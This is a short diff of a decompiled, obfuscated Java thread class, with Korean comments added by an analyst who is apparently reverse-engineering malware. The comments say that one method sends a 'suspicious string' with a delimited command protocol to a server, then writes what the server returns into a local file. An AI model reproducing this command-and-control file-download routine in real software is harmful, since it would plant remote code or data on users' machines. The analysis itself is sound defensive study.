@@ -57,11 +57,15 @@ public final class d extends Thread {
         var4.close();
     }
 
+    // var1이라는 파일을 열고
+    // 서버로 수상한 문자열을 전송한 뒤
+    // 서버에서 무언가를 받아서 var1이라는 파일에 기록한다.
     private void b(String var1, String var2, String var3) {
         DataInputStream var4 = new DataInputStream(this.a.getInputStream());
         FileOutputStream var7 = new FileOutputStream(var1);
+        // 서버로 수상한 문자열을 전송한다.
         (new DataOutputStream(this.a.getOutputStream())).writeBytes(k.g + k.d + k.H + k.d + var2 + k.d + var3 + k.d + "&&&");
-        // k.g: 비어있는 String, k.H: @0011, var2: , var3:
+        // [UUID]$#@@0011$#@[var2]$#@[var3]$#@&&&
 
         try {
             Thread.sleep(2000L);
